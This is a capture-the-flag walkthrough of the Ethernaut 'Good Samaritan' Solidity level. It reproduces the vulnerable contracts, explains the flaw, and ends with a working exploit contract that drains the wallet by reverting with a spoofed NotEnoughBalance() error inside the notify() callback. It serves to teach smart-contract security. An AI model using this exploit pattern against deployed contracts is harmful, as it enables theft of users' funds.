![](https://ethernaut.openzeppelin.com/imgs/BigLevel27.svg)

This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.

Would you be able to drain all the balance from his Wallet?

Things that might help:

- [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)

```sol
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

Solution:
## Analysis
### Wallet

```sol
contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}
```

- The wallet defines two custom errors at the top which it's using inside the revert statements.
- The function `donate10()` is the one that is called to donate 10 coins to the requestor. It checks the balance of the contract (`GoodSamaritan`) before the transfer and reverts with a custom error (`NotEnoughBalance()`) if it's less than 10. Else, it just transfers 10 coins.
- Function `transferRemainder()` transfers all the coins stored in the contract to the requestor. We need to somehow trigger this function.
- Both of the functions described above are `onlyOwner` allowing only the owner to call them. The owner will be `GoodSamaritan` contract in this case.

---
### Coin

```sol
contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}
```

- The Coin contract adds a million coins to the balance of the `GoodSamaritan` contract inside the constructor.
- The `transfer` function is important here. It is doing it's regular validations, decreasing the amount from the sender and increasing the destination's amount. But there's one specific validation that stands out - `if(dest_.isContract())`. This is checking if the address that requested the donation is a contract and calling the `notify()` function on the address, i.e., `dest_` contract. Since we control the requestor address, we can create a contract on that address and probably control the execution flow after the `INotifyable(dest_).notify(amount_)` is called.

---
### GoodSamaritan

```sol
contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}
```

- The contract is deploying new instances of the `Wallet` and `Coin` contracts.
- The function `requestDonation()` is of interest here. We can call this function externally. Note that this whole thing is inside a `try` and `catch` block.
    - The `try` block is executing the `wallet.donate10(msg.sender)` call with `msg.sender` being anyone who called the function.
    - The `catch` block is validating if the error thrown as a result of an error with the `try` block matches with the string of the custom error message `NotEnoughBalance()`. If it does match, then the wallet will transfer all the amount to us. This is what we need to achieve.

---
## The Attack Flow

Let's take a few steps back and trace what happens when we call the `requestDonation()` function:

1. We made a call to `requestDonation()` and the execution flow goes to `wallet.donate10(msg.sender)`.
2. The wallet contract calls `coin.transfer()` if everything goes well.
3. The `coin.transfer()` function does the necessary calculations, checks if our address is a contract, and then calls a `notify()` function on our address.
4. This is where we attack. We create a `notify()` function in our contract and make it revert a custom error with the name `NotEnoughBalance()`. This will trigger the error in the `GoodSamaritan.requestDonation()` function and the `catch()` block will be triggered transferring us all the tokens.
5. But wait, there's another catch. Transferring all the tokens won't work because our contract will just revert the transaction. To counter this, we will need to add another condition to our `notify()` function to check if the `amount <= 10`, and then only revert.

---
## The Exploit

Here's how our exploits code looks like:

```sol
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function wallet() external view returns(address);
    function coin() external view returns(address);

    function requestDonation() external returns(bool enoughBalance);
}

interface ICoin {
    function transfer(address dest_, uint256 amount_) external;
}

interface IWallet {
    // The owner of the wallet instance
    function owner() external view returns(address);
    function coin() external view returns(address);
    function donate10(address dest_) external;
    function transferRemainder(address dest_) external;
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract PWN is INotifyable {
     error NotEnoughBalance();

    IGoodSamaritan goodsamaritan  = IGoodSamaritan(0xD3301D80308A500346128ECE87085b172C01FF15); //ethernaut instance address
    function pwn() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
```

- The `pwn()` function is just for calling the `requestDonation()` to trigger the initial transfer.
- The transfer will then call our `notify()` function and since the amount will be 10, it'll revert.
- The revert will then trigger the `catch` block in `requestDonation()` and will transfer all the tokens to us.
- This time our `notify()` won't revert due to the `if` condition.